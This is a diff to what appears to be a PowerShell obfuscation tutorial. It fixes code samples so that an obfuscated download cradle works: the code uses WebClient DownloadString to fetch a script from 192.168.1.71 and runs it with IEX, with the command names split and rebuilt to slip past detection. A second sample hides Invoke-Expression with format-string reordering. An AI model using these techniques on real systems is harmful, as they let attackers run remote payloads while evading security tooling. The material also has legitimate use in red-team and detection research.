@@ -473,12 +473,12 @@ The above string can be obfuscated using **powershell special characters:** **`*
 <br />
 
 - String command to obfuscate<br />
-`("New-Object Net.WebClient).DownloadString('http://192.168.1.71/Hello.ps1')`
+`(New-Object Net.WebClient).DownloadString('http://192.168.1.71/Hello.ps1')`
 
 - String obfuscated<br />
 
-      $ScriptBlockContents = @"(#Ne"+"w-Ob"+"ject Ne"+"t.Web"+"Cli"+"ent#).DownloadString(!ht'+'tp:'+'//19'+'2.16'+'8.1'+'.71/Hello.ps1!)"@
-      $syscall = $ScriptBlockContents.Replace("+","").Replace('"','').Replace("'","").Replace("!","'").Replace('#','"')
+      $ScriptBlockContents = @"("Ne"+"w-Ob"+"ject Ne"+"t.Web"+"Cli"+"ent").DownloadString(!ht'+'tp:'+'//19'+'2.16'+'8.1'+'.71/Hello.ps1!)"@
+      $syscall = $ScriptBlockContents.Replace("+","").Replace('"','').Replace("'","").Replace("!","'")
       IEX $syscall
 
 ![powershell obfuscation](http://i.)
@@ -533,7 +533,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 `Invoke-Expression (New-Object)`
 
 - String obfuscated<br />
-`("{3}{0}{2}{1}{4}" -f'voke','es','-Expr','In','sion') ; ("{0}{2}{1}" -f'(New','ject)','-Ob'))`
+`$a=("{3}{0}{2}{1}{4}" -f'voke','es','-Expr','In','sion') ; $r=("{0}{2}{1}" -f'(New','ject)','-Ob'))`
 
 ![powershell obfuscation](http://i.cubeupload.com/1QWXPY.jpg)
 
